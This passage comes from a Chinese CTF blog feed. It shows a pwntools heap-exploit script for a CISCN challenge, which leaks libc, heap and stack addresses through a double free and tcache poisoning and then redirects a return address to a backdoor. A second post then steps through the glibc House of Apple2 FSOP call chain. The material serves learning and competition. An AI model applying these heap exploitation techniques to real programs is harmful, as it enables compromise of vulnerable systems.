class="comment">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;)</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> a != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        gdb.attach(io, a)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x - y) + <span class="number">0x10000</span>) % <span class="number">0x10000</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">rud = <span class="keyword">lambda</span> text: io.recvuntil(text, drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">lss = <span class="keyword">lambda</span> s :log.success(<span class="string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">p = <span class="keyword">lambda</span> s: <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line">url = <span class="string">&#x27;hnctf.imxbt.cn:49999&#x27;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">    <span class="comment">#io = process(banary, env=&#123;LD_LIBRARY:&#x27;./libc.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment">#io = process(banary,stdin=PTY,raw=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(*url.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27; &#x27;</span>).split())</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">&quot;edit\n&quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num, size</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;which one you choose?\n&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">&quot;the data:&quot;</span>)</span><br><span class="line">    buf = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        buf[i] = u8(io.recv(<span class="number">1</span>)) ^ ((i + <span class="number">153</span>) % <span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">data</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sa(<span class="string">&#x27;edit data:&#x27;</span>, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># leak libcbase &amp; heapbase</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x500</span>)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;which one you choose?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">free()</span><br><span class="line">base = u64(show()) - <span class="number">0x21ace0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line">key = u64(show())</span><br><span class="line">heapbase = key &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="comment"># leak backdoor &amp; clean bk</span></span><br><span class="line">magic()</span><br><span class="line">ru(<span class="string">&quot;magic address: &quot;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">s(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">free()</span><br><span class="line">edit(p64((heapbase + <span class="number">0x10</span>) ^ key))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x280</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x280</span>)</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">b&#x27;\x00\x00&#x27;</span> + <span class="string">b&#x27;\x02\x00&#x27;</span> + <span class="string">b&#x27;\x02\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line">environ = base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">edit(p64(environ ^ key))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">stack = u64(show())</span><br><span class="line"><span class="comment"># change ret_addr</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">free()</span><br><span class="line">buf_addr = backdoor - <span class="number">0x12BE</span> + <span class="number">0x4040</span></span><br><span class="line">ret_addr = stack - <span class="number">0x140</span></span><br><span class="line">edit(p64(buf_addr ^ key))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">edit(p64(ret_addr))</span><br><span class="line">edit(p64(backdoor+<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p(<span class="string">&#x27;ret_addr&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;buf_addr&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;environ&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;backdoor&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>CISCN</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>House of apple2调试</title>
    <url>/posts/Houseofapple2%E8%B0%83%E8%AF%95.html</url>
    <content><![CDATA[<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>这次依然是利用写poc的方式来一步一步调试</p>
<p>调用链：</p>
<h2 id="1、exit-–-run-exit-handlers"><a href="#1、exit-–-run-exit-handlers" class="headerlink" title="1、exit –&gt; __run_exit_handlers"></a>1、exit –&gt; __run_exit_handlers</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit --&gt; __run_exit_handlers</span><br><span class="line">exit (int status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, true, true);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (exit)</span><br></pre></td></tr></table></figure></div>

<h2 id="2、-run-exit-handlers-–-RUN-HOOK-IO-cleanup"><a href="#2、-run-exit-handlers-–-RUN-HOOK-IO-cleanup" class="headerlink" title="2、__run_exit_handlers –&gt; RUN_HOOK(IO_cleanup)"></a>2、__run_exit_handlers –&gt; RUN_HOOK(IO_cleanup)</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__run_exit_handlers --&gt; RUN_HOOK(IO_cleanup)</span><br><span class="line">__run_exit_handlers (int status, struct exit_function_list **listp,</span><br><span class="line">		     bool run_list_atexit, bool run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  /* First, call the TLS destructors.  */</span><br><span class="line">#ifndef SHARED</span><br><span class="line">  if (&amp;__call_tls_dtors != NULL)</span><br><span class="line">#endif</span><br><span class="line">    if (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  /* We do it this way to handle recursive calls to exit () made by</span><br><span class="line">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span><br><span class="line">     everyone on the list and use the status value in the last</span><br><span class="line">     exit (). */</span><br><span class="line">  while (true)</span><br><span class="line">    &#123;</span><br><span class="line">      struct exit_function_list *cur;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">    restart:</span><br><span class="line">      cur = *listp;</span><br><span class="line"></span><br><span class="line">      if (cur == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  /* Exit processing complete.  We will not allow any more</span><br><span class="line">	     atexit/on_exit registrations.  */</span><br><span class="line">	  __exit_funcs_done = true;</span><br><span class="line">	  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	  break;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      while (cur-&gt;idx &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">	  struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	  const uint64_t new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">	  /* Unlock the list while we call a foreign function.  */</span><br><span class="line">	  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	  switch (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      void (*atfct) (void);</span><br><span class="line">	      void (*onfct) (int status, void *arg);</span><br><span class="line">	      void (*cxafct) (void *arg, int status);</span><br><span class="line"></span><br><span class="line">	    case ef_free:</span><br><span class="line">	    case ef_us:</span><br><span class="line">	      break;</span><br><span class="line">	    case ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line">#ifdef PTR_DEMANGLE</span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line">#endif</span><br><span class="line">	      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	      break;</span><br><span class="line">	    case ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line">#ifdef PTR_DEMANGLE</span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line">#endif</span><br><span class="line">	      atfct ();</span><br><span class="line">	      break;</span><br><span class="line">	    case ef_cxa:</span><br><span class="line">	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span><br><span class="line">		 we must mark this function as ef_free.  */</span><br><span class="line">	      f-&gt;flavor = ef_free;</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">#ifdef PTR_DEMANGLE</span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line">#endif</span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	      break;</span><br><span class="line">	    &#125;</span><br><span class="line">	  /* Re-lock again before looking at global state.  */</span><br><span class="line">	  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">	    /* The last exit function, or another thread, has registered</span><br><span class="line">	       more exit functions.  Start the loop over.  */</span><br><span class="line">	    goto restart;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      if (*listp != NULL)</span><br><span class="line">	/* Don&#x27;t free the last element in the chain, this is the statically</span><br><span class="line">	   allocate element.  */</span><br><span class="line">	free (cur);</span><br><span class="line"></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715931729602-998d3385-be5a-41b9-aa97-63974950f103.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>接着进入看源码</p>
<h2 id="3、RUN-HOOK-IO-cleanup-–-IO-flush-all-lockp"><a href="#3、RUN-HOOK-IO-cleanup-–-IO-flush-all-lockp" class="headerlink" title="3、RUN_HOOK(IO_cleanup) –&gt; _IO_flush_all_lockp"></a>3、RUN_HOOK(IO_cleanup) –&gt; _IO_flush_all_lockp</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN_HOOK(IO_cleanup) --&gt; _IO_flush_all_lockp</span><br><span class="line">int</span><br><span class="line">_IO_cleanup (void)</span><br><span class="line">&#123;</span><br><span class="line">  /* We do *not* want locking.  Some threads might use streams but</span><br><span class="line">     that is their problem, we flush them underneath them.  */</span><br><span class="line">  int result = _IO_flush_all_lockp (0);</span><br><span class="line"></span><br><span class="line">  /* We currently don&#x27;t have a reliable mechanism for making sure that</span><br><span class="line">     C++ static destructors are executed in the correct order.</span><br><span class="line">     So it is possible that other static destructors might want to</span><br><span class="line">     write to cout - and they&#x27;re supposed to be able to do so.</span><br><span class="line"></span><br><span class="line">     The following will make the standard streambufs be unbuffered,</span><br><span class="line">     which forces any output from late destructors to be written out. */</span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="4、-IO-flush-all-lockp-–-IO-wfile-overflow"><a href="#4、-IO-flush-all-lockp-–-IO-wfile-overflow" class="headerlink" title="4、_IO_flush_all_lockp –&gt; _IO_wfile_overflow"></a>4、_IO_flush_all_lockp –&gt; _IO_wfile_overflow</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_IO_flush_all_lockp --&gt; _IO_wfile_overflow</span><br><span class="line">int</span><br><span class="line">_IO_flush_all_lockp (int do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  int result = 0;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      if (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      if (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715931994201-aeb549cd-dfac-42f6-be90-a6fc1b1417e4.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>主要是要满足第一个就够了，就可以去调用overflow</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></div>

<p>此时我们利用poc用0x500大小的chunk来伪造一个_IO_list_all</p>
<p>那么此时发现程序是不会执行overflow的，我们把对应的条件设置好,mode本身就是0，所以不用设置</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">_IO_write_ptr = <span class="number">2</span></span><br><span class="line">_IO_write_base = <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715933989951-eabc87b7-7f6e-4334-bf04-3e256dfcbcdc.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>此时我们再运行试下</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715934027269-ee0fc291-f933-4e15-a6d7-e06bfab23a1f.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>到了这里，也就是虚标检测，最后再跳到虚表，所以我们还得把虚标位置写为<code>_IO_wfile_jumps</code></p>
<p>不然会跳不过去的</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715934495765-1c478805-6475-499d-838e-b76dcbdfefed.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>现在程序就到这里了</p>
<h2 id="5、-IO-wfile-overflow-–-IO-wdoallocbuf"><a href="#5、-IO-wfile-overflow-–-IO-wdoallocbuf" class="headerlink" title="5、_IO_wfile_overflow –&gt; _IO_wdoallocbuf"></a>5、_IO_wfile_overflow –&gt; _IO_wdoallocbuf</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow --&gt; _IO_wdoallocbuf</span><br></pre></td></tr></table></figure></div>

<p>看下源码</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow (FILE *f, wint_t wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  /* If currently reading <span class="keyword">or</span> no buffer allocated. */</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Allocate a buffer <span class="keyword">if</span> needed. */</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == NULL)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  /* Otherwise must be currently reading.  If _IO_read_ptr</span><br><span class="line">	     (<span class="keyword">and</span> hence also _IO_read_end) <span class="keyword">is</span> at the buffer end,</span><br><span class="line">	     logically slide the buffer forwards one block (by setting</span><br><span class="line">	     the read pointers to <span class="built_in">all</span> point at the beginning of the</span><br><span class="line">	     block).  This makes room <span class="keyword">for</span> subsequent output.</span><br><span class="line">	     Otherwise, <span class="built_in">set</span> the read pointers to _IO_read_end (leaving</span><br><span class="line">	     that alone, so it can <span class="keyword">continue</span> to correspond to the</span><br><span class="line">	     external position). */</span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">	      f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">		f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">	f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_flush (f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    /* Buffer <span class="keyword">is</span> really full */</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == L<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>很多内容，但是我们的目的是到<code>_IO_wdoallocbuf</code>，所以只看前两个if就可以了，肯定不能让第一个if满足</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715934883791-936e8461-0e94-462f-922c-07e0b2caedaa.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>也就是说要<code>f-&gt;_flags &amp; 0x8 ==0</code>才行</p>
<p>还要满足第二个，也就是<code>f-&gt;_flags &amp; 0x800 == 0</code>，<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715935050198-b41020a4-7b2f-4635-8236-272d90382f93.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>其实我们的伪造的IO中，flag值已经被我们设置为0了，主要就是看<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
<p>我们直接把<code>_wide_data</code>的值设置为我们的<code>fake_IO_list_all</code>，并且我们的write_base要等于0</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/1715935920243-11ad6cca-d28c-4946-9600-9bed4ce64ee1.png"
                      alt="img"
                ><figcaption>img</figcaption></figure></p>
<p>现在我们如愿跳到了<code>_IO_wdoallocbuf</code></p>
